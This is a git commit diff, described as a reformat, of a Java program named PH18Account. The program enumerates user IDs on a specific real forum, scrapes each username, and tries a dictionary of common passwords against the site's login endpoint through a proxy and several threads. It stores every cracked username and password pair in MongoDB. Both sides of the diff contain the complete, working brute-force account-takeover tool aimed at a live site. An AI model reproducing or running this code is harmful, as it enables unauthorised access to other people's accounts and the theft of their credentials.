82d718e4309fa4d0c154cf5fc3fd382ef2a1337c
giter <nubix@qq.com>
2012-12-17 19:55:22 +0800

    reformat

--- src/main/java/account/PH18Account.java
+++ src/main/java/account/PH18Account.java
@@ -22,91 +22,87 @@ import com.mongodb.Mongo;
 
 public class PH18Account {
 
-	static HttpClient util = new HttpClient().connect(3000).read(30000)
-			.persistCookies(false).proxier(new DefaultProxier());
+  static HttpClient util = new HttpClient().connect(3000).read(30000).persistCookies(false)
+      .proxier(new DefaultProxier());
 
-	final static String dic[] = new String[] { "000000", "111111", "11111111",
-			"112233", "123123", "123321", "123456", "12345678", "654321",
-			"666666", "888888", "abcdef", "abcabc", "abc123", "a1b2c3",
-			"aaa111", "123qwe", "qwerty", "qweasd", "admin", "password",
-			"p@ssword", "passwd", "iloveyou", "5201314" };
+  final static String dic[] = new String[] { "000000", "111111", "11111111", "112233", "123123", "123321", "123456",
+      "12345678", "654321", "666666", "888888", "abcdef", "abcabc", "abc123", "a1b2c3", "aaa111", "123qwe", "qwerty",
+      "qweasd", "admin", "password", "p@ssword", "passwd", "iloveyou", "5201314" };
 
-	public static void main(String[] args) throws InterruptedException,
-			UnknownHostException {
+  public static void main(String[] args) throws InterruptedException, UnknownHostException {
 
-		ExecutorService pool = Executors.newFixedThreadPool(5);
+    ExecutorService pool = Executors.newFixedThreadPool(3);
 
-		Mongo m = new Mongo();
-		DB db = m.getDB("ph18");
+    Mongo m = new Mongo();
+    DB db = m.getDB("ph18");
 
-		final DBCollection coll = db.getCollection("users");
-		final Pattern ptn = Pattern.compile("<title>([^@]+)@");
-		final AtomicInteger pc = new AtomicInteger();
+    final DBCollection coll = db.getCollection("users");
+    final Pattern ptn = Pattern.compile("<title>([^@]+)@");
+    final AtomicInteger pc = new AtomicInteger();
 
-		for (int i = 900; i < 99999; i++) {
+    for (int i = 900; i < 99999; i++) {
 
-			final int j = i;
-			pool.submit(new Runnable() {
-				@Override
-				public void run() {
+      final int j = i;
+      pool.submit(new Runnable() {
 
-					String url = "http://www.18ph.com/home.php?mod=rss&uid="
-							+ j;
-					String content;
+        @Override
+        public void run() {
 
-					try {
+          String url = "http://www.18ph.com/home.php?mod=rss&uid=" + j;
+          String content;
 
-						content = util.GET(url).getValue();
+          try {
 
-						Matcher matcher = ptn.matcher(content);
+            System.out.println("processing " + url);
 
-						if (matcher.find()) {
+            content = util.GET(url).getValue();
+            Matcher matcher = ptn.matcher(content);
 
-							BasicDBObject dbo = new BasicDBObject("_id", j)
-									.append("name", matcher.group(1));
-							for (String pwd : dic) {
-								if (!"wrong".equals(guess(dbo, pwd))) {
-									dbo.append("pwd", pwd);
-									coll.save(dbo);
-									System.out.println(dbo);
-									break;
-								}
-							}
-						}
+            if (matcher.find()) {
 
-						Thread.sleep(1000);
+              BasicDBObject dbo = new BasicDBObject("_id", j).append("name", matcher.group(1));
+              for (String pwd : dic) {
+                if (!"wrong".equals(guess(dbo, pwd))) {
+                  dbo.append("pwd", pwd);
+                  coll.save(dbo);
+                  System.out.println(dbo);
+                  break;
+                }
+              }
+            }
 
-						if (pc.incrementAndGet() % 100 == 0) {
-							System.out.println(pc.get());
-						}
+            Thread.sleep(1000);
 
-					} catch (IOException | InterruptedException e) {
-					}
-				}
-			});
+            if (pc.incrementAndGet() % 100 == 0) {
+              System.out.println(pc.get());
+            }
 
-		}
+          } catch (IOException | InterruptedException e) {
+          }
+        }
+      });
 
-		pool.shutdown();
-		pool.awaitTermination(2, TimeUnit.DAYS);
+    }
 
-		m.close();
-	}
+    pool.shutdown();
+    pool.awaitTermination(2, TimeUnit.DAYS);
 
-	private static String guess(BasicDBObject dbo, String pwd)
-			throws IOException {
+    m.close();
+  }
 
-		Map<String, String> param = new HashMap<String, String>();
-		param.put("username", dbo.get("name").toString());
-		param.put("cookietime", "2592000");
-		param.put("password", pwd);
-		param.put("quickforward", "yes");
-		param.put("handlekey", "ls");
+  private static String guess(BasicDBObject dbo, String pwd) throws IOException {
 
-		String res = util
-				.POST("http://www.18ph.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1",
-						param).getValue();
+    Map<String, String> param = new HashMap<String, String>();
+    param.put("username", dbo.get("name").toString());
+    param.put("cookietime", "2592000");
+    param.put("password", pwd);
+    param.put("quickforward", "yes");
+    param.put("handlekey", "ls");
 
-		return res.contains("欢迎您回来") ? pwd : "wrong";
-	}
+    String res = util.POST(
+        "http://www.18ph.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1",
+        param).getValue();
+
+    return res.contains("欢迎您回来") ? pwd : "wrong";
+  }
 }
